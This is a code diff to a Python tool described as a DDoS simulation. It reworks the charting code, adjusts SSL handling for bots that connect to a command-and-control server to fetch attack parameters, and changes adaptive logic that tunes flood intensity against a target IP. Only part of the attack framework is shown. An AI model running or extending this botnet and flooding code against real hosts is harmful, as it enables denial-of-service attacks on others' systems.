@@ -136,11 +136,11 @@ class Bot:
     def __init__(self, cnc_server):
         self.cnc_server = cnc_server
         self.packet_generator = PacketGenerator(None, None, None)
-        self.ssl_context = ssl._create_unverified_context()
+        self.ssl_context = None if not cnc_server.use_ssl else ssl._create_unverified_context()
 
     async def start(self):
         uri = f"{'wss' if self.cnc_server.use_ssl else 'ws'}://{self.cnc_server.host}:{self.cnc_server.port}"
-        async with websockets.connect(uri, ssl=self.ssl_context) as websocket:
+        async with websockets.connect(uri, ssl=self.ssl_context if self.cnc_server.use_ssl else None) as websocket:
             while True:
                 await websocket.send("get_attack_params")
                 response = await websocket.recv()
@@ -221,16 +221,78 @@ class AttackSimulator:
         self.byte_count = 0
         self.packet_generator = PacketGenerator(target_ip, target_port, methods)
         self.anomaly_detector = IsolationForest(contamination=0.1, random_state=42)
-        self.anomaly_detector.fit(np.random.randn(100, 4))  # Fit with dummy data initially
+        # Fit the model with some initial data
+        self.anomaly_detector.fit(np.random.rand(10, 4))        
         self.attack_intensity = 1.0
-        self.cnc_server = CnCServer(host='0.0.0.0', port=8765, use_ssl=False)
+        self.cnc_server = CnCServer()
         self.botnet = BotnetSimulator(num_bots, self.cnc_server)
-        self.visualizer = RealTimeVisualizer()
+        
+        # Variables to store data for plotting
+        self.timestamps = []
+        self.packet_rates = []
+        self.bandwidths = []
+        self.cpu_usages = []
+        self.memory_usages = []
+
+        # Initialize matplotlib figure
+        self.fig, self.axs = plt.subplots(4, 1, figsize=(10, 12))
+        self.fig.tight_layout(pad=4.0)
+
+    def update_chart(self, stats):
+        """Update the chart with new stats."""
+        # Append the new stats
+        self.timestamps.append(stats['timestamp'])
+        self.packet_rates.append(stats['packet_rate'])
+        self.bandwidths.append(stats['bandwidth'])
+        self.cpu_usages.append(stats['cpu_usage'])
+        self.memory_usages.append(stats['memory_usage'])
+
+        # Limit the data for smoother visualization (keeping last 50 data points)
+        self.timestamps = self.timestamps[-50:]
+        self.packet_rates = self.packet_rates[-50:]
+        self.bandwidths = self.bandwidths[-50:]
+        self.cpu_usages = self.cpu_usages[-50:]
+        self.memory_usages = self.memory_usages[-50:]
+
+        # Clear previous plots
+        for ax in self.axs:
+            ax.clear()
+
+        # Update the plots
+        self.axs[0].plot(self.timestamps, self.packet_rates, label='Packet Rate (pps)', color='blue')
+        self.axs[0].set_title('Packet Rate Over Time')
+        self.axs[0].set_xlabel('Time')
+        self.axs[0].set_ylabel('Packets/s')
+        self.axs[0].legend()
+
+        self.axs[1].plot(self.timestamps, self.bandwidths, label='Bandwidth (bps)', color='green')
+        self.axs[1].set_title('Bandwidth Over Time')
+        self.axs[1].set_xlabel('Time')
+        self.axs[1].set_ylabel('Bits/s')
+        self.axs[1].legend()
+
+        self.axs[2].plot(self.timestamps, self.cpu_usages, label='CPU Usage (%)', color='red')
+        self.axs[2].set_title('CPU Usage Over Time')
+        self.axs[2].set_xlabel('Time')
+        self.axs[2].set_ylabel('CPU Usage %')
+        self.axs[2].legend()
+
+        self.axs[3].plot(self.timestamps, self.memory_usages, label='Memory Usage (%)', color='orange')
+        self.axs[3].set_title('Memory Usage Over Time')
+        self.axs[3].set_xlabel('Time')
+        self.axs[3].set_ylabel('Memory Usage %')
+        self.axs[3].legend()
+
+        # Draw the plots
+        self.fig.canvas.draw()
+        
+        # Save the chart every 30 seconds
+        if len(self.timestamps) % 30 == 0:
+            self.fig.savefig(f"attack_visualization_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
 
     async def run_simulation(self):
         cnc_task = asyncio.create_task(self.cnc_server.start_server())
         botnet_task = asyncio.create_task(self.botnet.launch_attack())
-        visualization_task = asyncio.create_task(self.run_visualization())
         
         attack_params = {
             'target_ip': self.target_ip,
@@ -244,8 +306,7 @@ class AttackSimulator:
         with open(self.output_file, 'w', newline='') as csvfile:
             fieldnames = ['timestamp', 'packets_sent', 'bytes_sent', 'elapsed_time', 'packet_rate', 'bandwidth',
                           'cpu_usage', 'memory_usage', 'network_bytes_sent', 'network_bytes_recv',
-                          'network_packets_sent', 'network_packets_recv', 'attack_intensity',
-                          'src_ip', 'dest_ip']
+                          'network_packets_sent', 'network_packets_recv', 'attack_intensity']
             writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
             writer.writeheader()
 
@@ -269,19 +330,22 @@ class AttackSimulator:
                     'network_bytes_recv': network_io.bytes_recv,
                     'network_packets_sent': network_io.packets_sent,
                     'network_packets_recv': network_io.packets_recv,
-                    'attack_intensity': self.attack_intensity,
-                    'src_ip': self.packet_generator.last_src_ip,
-                    'dest_ip': self.target_ip
+                    'attack_intensity': self.attack_intensity
                 }
                 
                 writer.writerow(stats)
                 self.stats_queue.put(stats)
-                self.visualizer.add_data(elapsed_time, stats['packet_rate'], stats['bandwidth'], stats['src_ip'], stats['dest_ip'])
 
+                # Update the chart with the latest stats
+                self.update_chart(stats)
+
+                # Adaptive attack logic (adjust intensity)
                 if len(self.stats_queue.queue) > 10:
                     recent_stats = [self.stats_queue.get() for _ in range(10)]
                     df = pd.DataFrame(recent_stats)
                     X = df[['packet_rate', 'bandwidth', 'cpu_usage', 'memory_usage']].values
+                    # Optionally, you can refit the model with new data
+                    self.anomaly_detector.fit(X)
                     anomaly_scores = self.anomaly_detector.decision_function(X)
                     if np.mean(anomaly_scores) > 0:
                         self.attack_intensity *= 0.9
@@ -291,42 +355,7 @@ class AttackSimulator:
 
                 await asyncio.sleep(1)
 
-        await asyncio.gather(cnc_task, botnet_task, visualization_task)
-
-    async def run_visualization(self):
-            self.visualizer.start_animation()
-
-    def generate_detailed_plots(self):
-        df = pd.read_csv(self.output_file)
-        
-        fig, axes = plt.subplots(3, 2, figsize=(16, 20))
-        
-        df.plot(x='timestamp', y='packet_rate', ax=axes[0, 0], title='Packet Rate over Time')
-        df.plot(x='timestamp', y='bandwidth', ax=axes[0, 1], title='Bandwidth over Time')
-        df.plot(x='timestamp', y='cpu_usage', ax=axes[1, 0], title='CPU Usage over Time')
-        df.plot(x='timestamp', y='memory_usage', ax=axes[1, 1], title='Memory Usage over Time')
-        df.plot(x='timestamp', y='attack_intensity', ax=axes[2, 0], title='Attack Intensity over Time')
-        
-        network_df = df[['timestamp', 'network_bytes_sent', 'network_bytes_recv']]
-        network_df.plot(x='timestamp', ax=axes[2, 1], title='Network I/O over Time')
-        
-        for ax in axes.flatten():
-            ax.set_xlabel('Timestamp')
-            ax.legend()
-        
-        plt.tight_layout()
-        plt.savefig('detailed_visualization.png', dpi=300)
-        plt.close()
-
-        # Create a separate plot for IP addresses
-        plt.figure(figsize=(12, 8))
-        plt.scatter(df['timestamp'], df['src_ip'], alpha=0.5, c=df['packet_rate'], cmap='viridis')
-        plt.colorbar(label='Packet Rate')
-        plt.xlabel('Timestamp')
-        plt.ylabel('Source IP')
-        plt.title('Source IPs over Time (colored by Packet Rate)')
-        plt.savefig('ip_visualization.png', dpi=300)
-        plt.close()
+        await asyncio.gather(cnc_task, botnet_task)
 
 def run_simulation(args):
     print(f"Starting DDoS simulation against {args.target_ip}:{args.target_port}")
